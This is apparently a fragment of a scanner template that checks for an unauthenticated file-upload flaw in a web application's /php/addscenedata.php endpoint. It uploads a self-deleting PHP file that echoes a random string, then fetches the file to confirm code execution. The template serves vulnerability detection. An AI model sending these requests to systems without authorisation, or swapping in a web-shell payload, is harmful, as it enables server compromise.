        POST /php/addscenedata.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        Connection: close
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4LuoBRpTiVBo9cIQ
        Accept-Encoding: gzip

        ------WebKitFormBoundary4LuoBRpTiVBo9cIQ
        Content-Disposition: form-data; name="upload"; filename="{{num}}.php"
        Content-Type: application/octet-stream

        <?php echo '{{randstr}}';unlink(__FILE__);?>
        ------WebKitFormBoundary4LuoBRpTiVBo9cIQ--
        -de3b7a45ced9f35720e192ff54eb83908644f0ec70b3dc6fb19b6b5f0828--

      - |
        GET /images/scene/{{num}}.php HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 200 && status_code_2 == 200
          - contains(body_2,'{{randstr}}')
        condition: and